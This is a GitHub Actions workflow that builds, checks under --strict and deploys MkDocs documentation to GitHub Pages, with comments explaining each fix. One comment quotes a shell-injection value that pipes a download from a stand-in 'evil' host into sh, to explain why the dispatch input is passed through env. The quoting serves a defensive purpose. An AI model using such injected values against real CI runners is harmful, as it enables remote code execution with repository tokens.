name: Documentation

# The validate job below has always carried `if: github.event_name ==
# 'pull_request'`, and there was no pull_request trigger — so it was dead code,
# and `mkdocs build --strict`, which lives only there, had never run in CI on
# any commit. The readiness guide's claim that "the site builds clean under
# --strict" was backed by nothing. The trigger is added here; build and deploy
# stay push-only, because a pull request must never publish to Pages.
on:
  push:
    branches: [main]
    paths:
      - 'docs/**'
      - 'api/openapi/**'
      - '.github/workflows/docs.yml'
  pull_request:
    paths:
      - 'docs/**'
      - 'api/openapi/**'
      - '.github/workflows/docs.yml'
  workflow_dispatch:
    inputs:
      version:
        description: 'Documentation version (e.g., v1.0.0)'
        required: false
        default: 'latest'

permissions:
  contents: read
  pages: write
  id-token: write

# Deploys serialise on one `pages` group and must never cancel each other.
# Pull-request validations are per-ref and supersede themselves, so they do not
# queue behind a deploy — sharing the group would have made every docs PR wait
# on the Pages environment for no reason.
concurrency:
  group: ${{ github.event_name == 'pull_request' && format('docs-pr-{0}', github.ref) || 'pages' }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  build:
    # Push and workflow_dispatch only: this job runs `mike deploy`, which
    # writes the gh-pages branch.
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: '3.12'
          cache: pip
          cache-dependency-path: docs/requirements.txt

      - name: Install dependencies
        run: |
          pip install -r docs/requirements.txt
          pip install mike

      - name: Configure Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: Build MkDocs documentation
        run: mkdocs build --config-file docs/mkdocs.yml --site-dir ../site-main

      - name: Copy API documentation
        run: |
          mkdir -p ../site/api
          if [ -d "docs/api" ]; then
            cp -r docs/api/* ../site/api/
          fi
          if [ -d "api/openapi" ]; then
            mkdir -p ../site/api/specs
            cp -r api/openapi/* ../site/api/specs/
          fi

      - name: Merge sites
        run: |
          if [ -d "site-main/api" ]; then
            rm -rf site-main/api
          fi
          if [ -d "site/api" ]; then
            cp -r site/api site-main/
          fi
          mv site-main site

      # github.event.inputs.version is a workflow_dispatch input: text a user
      # types, interpolated by the expression engine BEFORE the shell sees the
      # script, so `"; curl evil | sh; #` would run on the runner with this
      # job's token. Semgrep's run-shell-injection rule is right. Through env:
      # the value arrives as data the shell reads, not as script text.
      - name: Deploy with mike (versioning)
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_VERSION"
          else
            # Extract version from git tag or use 'latest'
            VERSION=$(git describe --tags --exact-match 2>/dev/null || echo "latest")
          fi

          # Deploy with mike for versioning. On a non-tag push VERSION falls back
          # to "latest"; passing "latest latest" (version == alias) makes mike
          # error "duplicated version and alias" — which failed this workflow on
          # every push to main. Only attach the 'latest' alias for a real tag.
          if [ "$VERSION" = "latest" ]; then
            mike deploy --config-file docs/mkdocs.yml --branch gh-pages --update-aliases latest
          else
            mike deploy --config-file docs/mkdocs.yml --branch gh-pages --update-aliases "$VERSION" latest
          fi
          mike set-default --config-file docs/mkdocs.yml --branch gh-pages latest

      - name: Upload artifact
        uses: actions/upload-pages-artifact@v3
        with:
          path: site

  deploy:
    needs: build
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v5

  # The docs gate. `--strict` turns MkDocs' warnings — a broken internal link, a
  # nav entry pointing at a file that does not exist, an unreadable config — into
  # a failed build, which is the only reason this job is worth having.
  validate:
    name: Docs build clean under --strict
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v7
        with:
          # git-revision-date-localized reads the log; a shallow clone makes it
          # fall back to the build date for every page.
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: '3.12'
          cache: pip
          cache-dependency-path: docs/requirements.txt

      - name: Install dependencies
        run: pip install -r docs/requirements.txt

      # --site-dir is explicit because mkdocs resolves a relative site_dir
      # against the CONFIG file's directory: without it the site lands in
      # docs/site and the link pass below looked at ./site/index.html, a path
      # that never existed — which its `|| true` hid completely.
      - name: Build documentation
        run: mkdocs build --config-file docs/mkdocs.yml --strict --site-dir "$GITHUB_WORKSPACE/site"

      # Internal links are already gated: mkdocs --strict fails the build above on
      # any link that does not resolve inside the site. This pass is about
      # EXTERNAL links, whose liveness is not this repository's to guarantee —
      # a third-party site going down for an afternoon must not block a merge.
      # It stays non-blocking on purpose; the output is there to read.
      - name: Report dead external links (informational)
        run: |
          pip install linkchecker
          linkchecker site/index.html --check-extern || true
